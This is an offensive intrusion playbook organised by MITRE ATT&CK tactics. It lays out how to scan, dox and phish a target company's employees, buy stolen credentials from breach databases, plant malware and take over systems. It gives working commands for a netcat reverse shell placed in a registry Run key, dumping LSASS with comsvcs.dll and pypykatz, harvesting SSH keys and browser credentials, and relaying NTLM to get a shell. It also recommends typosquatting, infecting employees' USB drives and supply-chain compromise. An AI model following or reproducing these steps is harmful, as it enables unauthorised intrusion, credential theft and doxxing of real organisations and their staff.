Based off MITRE ATT&CK framework



RECON:

active scanning:
scanning ip blocks: scan a target ip block for ports, use shodan to be stealthy. (or use masscan or whatever) 
ASN scanning: this is not recommended by me, but it could be located in the same network. Go to https://www.crunchbase.com, search up the target, go to financials, and go to acquisitions to find other targets that may be in scope.
Wordlist Scanning: scan directoryes (ffuf), web perameters (ffuf), robots.txt, and use web crawlers. 

Gather Victim Host Info:
find emails (https://github.com/sharsil/mailcat https://hunter.io) and employ names (google dorks). Dox all the employes (maltego) in order to possibly gain access to some accounts. Use breach directory or leakwiki.txt to find creds for victim emails.

Enumerate for (web application) firewalls. (https://github.com/EnableSecurity/wafw00f)

Find physical locations.

Identify employs roles in the company.

Find business relationships (useful for phishing attacks).

Phishing:
Service: phish over social media or something

find victim websites



RESOURCE DEVELOPMENT:

Register domains for phishing/exploiting/c2 (https://www.rankwatch.com/free-tools/typo-generator target employes who mistype company website)

Get a lot of proxies (https://proxyscrape.com/free-proxy-list)

Use a lot of VPS for hosting/scanning.

Compromise social media/email accounts in order to phish other employs with malware. (https://www.breachdirectory.org/ https://intelx.io)

Develop exploits for later use.

Devlop malware. (Basic reverse shell for manual anti virus/edr disabling)

Drive-by target: I'm going to list the procedure examples, APT32 uses real articals to make a website look legit, but they'll host malicous javascript on it (browser exploits, droppers, etc). Dragonfly has compromised website to redirect traffic to exploit kits (malware 'n exploits). Threat Group-3390 started ip logging everyone. 

Subdomain takover (not in ATT&CK framework): this can be used when a subdomain is pointing to a deleted service, for ex, a github page, you can make that into your github page and infect everyone visiting it with malware. I put this here because it would be useful in phishing attacks.



INITAIL ACCESS:

Phishing:
Attachment: add malware (use malware notes)
Link: browser exploitation (autopwn) or phish for creds or even make your own fake service for employes that re-use passwords

Exploit public facing application: basicly hack a website, use your recon notes (that you should have made because you didn't skip to this step), use owsap top 10, vuln scanners, my notes, and https://www.cobalt.io/vulnerability-wiki/ in order to hack it. 

Exploit external remote services: https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp & nmap vulns & brute forcing & spraying

Hardware additions: use things like the bash bunny in order to infect computers

Phishing: use malware, web pages with fake logins, web pages with real sign ups (harvest creds of employes who reuse passwords), web pages with ip loggers, or/and web pages with exploits (autopwn metasploit). Use https://github.com/BishopFox/spoofcheck to check domain email security of target website.

Replication through removable media: infect employ USBs with malware, great example: https://github.com/NYAN-x-CAT/LimeUSB-Csharp

Supply chain compromise: hack into things being used by the company, like javascript hosters, or, software used by employs.

Trusted relationship: for example hack into the vps company in order to get the vps creds of the target.

Default accounts/weak passwords: basicly brute force things with commonly used passwords/usrnames. (or use known defualt creds)

Hack the wifi: capture hash, brute force hash.



EXECUTION (infection with malware):

Abuse command and scripting interpreters already existing on the target machiene. 

Abuse scheduled tasks/jobs (SCHTASKS /CHANGE /TN "FOLDERPATH\TASKNAME" /ST HH:MM) (Example: SCHTASKS /CHANGE /TN "MyTasks\Notepad task" /ST 09:00)

Use LOLbins for malware execution. (https://lolbas-project.github.io/# https://github.com/LOLBAS-Project/LOLBAS)



PERSISTENCE:

Add accounts (for web services, computers, etc) 

Harvest ssh keys (windows: c:\Users\<username>\.ssh) (linux: /root/.ssh /etc/ssh ~.ssh) (more linux: grep -ir "BEGIN RSA PRIVATE KEY" /* ; grep -ir "BEGIN DSA PRIVATE KEY" /*)

Autostart execution: use startup folder (%appdata%\Microsoft\Windows\Start Menu\Programs\Startup), registry keys (HKCU\Environment\UserInitMprLogonScript), scheduled tasks, shortcuts, and infect commonly used applications. (example: REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\CurrentVersion\Run /v 1 /d "C:\Users\guest\Downloads\nc.exe -e cmd.exe IP PORT")

Browser extensions.

lnk poisining (execute both, example: powershell.exe -c "invoke-item \\VBOXSVR\Tools\HxD\HxD64.exe; invoke-item c:\windows\system32\calc.exe")



PRIVLEGE ESCELATION:

read notes



DEFENSE EVASION:

Debuger evasion: IsDebuggerPresent, is_debugging, ptrace_deny_attach

Crypt/obfuscate: make your own crypter for shellcode. Use math, for example, payload = \x02\x03\x04\x06 (+2 x2 -2) \x06\x08\x10\x14

Modify GPO using GPM (group policy managmnt)

read malware notes

Don't use proccess injection unless your injecting the proccess with packed stuff.



CREDENTIAL ACCESS:

Use https://github.com/lgandx/Responder for credential access on the local network.

Spray the network with passwords.

keychain: security dump-keychain â€“d

Web browser creds and cookies (use .\lazagne.exe all -v)

os credential dumping with mimkatz, lazagne, or /etc/shadow. or use "tasklist" get lsass process id, "powershell -c rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PROCESSIDOFLSASS> C:\Users\<username>\%computername%.dmp full" upload C:\Users\<username>\<computername>.dmp to your linux machiene and use "pypykatz lsa minidump <file>.dmp" And lastly use mimipengiun for linux

list kerbose tickets with klist or (on linux) /var/lib/sss/secrets/secrets.ldb and /var/lib/sss/secrets/.secrets.mkey

read files like bash history/powershell history.

use ada notes for active directory dumping.

keylog

use responder (and impackt-ntlmrekalx -smb2support -t <target> -c 'cmd /c "<command>"' in order to get a reverse shell)



DISCOVERY:

local account discovery: net user (windows)
domain account discovery: Commands such as net user /domain and net group /domain of the Net utility, dscacheutil -q groupon macOS, and ldapsearch on Linux can list domain users and groups.
email discovery: Get-GlobalAddressList or use your brain 
List azure accounts: az ad user list

find existing connections: netstat <-ano> (for windows), net session (find logged in users windows), In Mac and Linux, netstat and lsof can be used to list current connections. who -a and w can be used to show which users are currently logged in

password policies: net accounts (/domain), Get-ADDefaultDomainPasswordPolicy, chage -l , cat /etc/pam.d/common-password, and pwpolicy getaccountpolicies. GetAccountPasswordPolicy aws



LATERAL MOVMENT:

use arp scan in the other software folder in order to find IPs of systems on your local network.

exploit/brute force local services

exploit things like zerologon printnightmare etc

taint shared content

email other employs with an embeded image/non embeded link that will trigger responder (\\nqwfoniqnfoiwnogji but embeded) 



EXFELTRAITION:

network duplication

keylog

audio/screen capture

clipboard capture


not doing impact or C&C






